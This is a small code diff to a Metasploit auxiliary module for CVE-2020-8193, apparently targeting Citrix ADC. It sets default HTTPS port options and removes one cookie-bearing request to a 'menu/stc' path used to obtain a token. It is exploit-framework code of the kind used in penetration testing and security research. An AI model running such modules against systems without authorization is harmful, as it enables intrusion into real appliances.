@@ -32,7 +32,11 @@ class MetasploitModule < Msf::Auxiliary
         ['URL', 'https://github.com/jas502n/CVE-2020-8193']
       ],
       'DisclosureDate' => '2020-07-09',
-      'License'        => MSF_LICENSE
+      'License'        => MSF_LICENSE,
+      'DefaultOptions' => {
+        'RPORT' => 443,
+        'SSL' => true
+      }
     ))
 
     register_options([
@@ -87,13 +91,6 @@ class MetasploitModule < Msf::Auxiliary
 
       return unless response && response.code == 200
     end
-
-    response = send_request_cgi(
-      'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, 'menu', 'stc'),
-      'cookie' => @cookie
-    )
-    return unless response && response.code == 200
 
     response.to_s.scan(/rand = "([^"]+)"/).join
   end
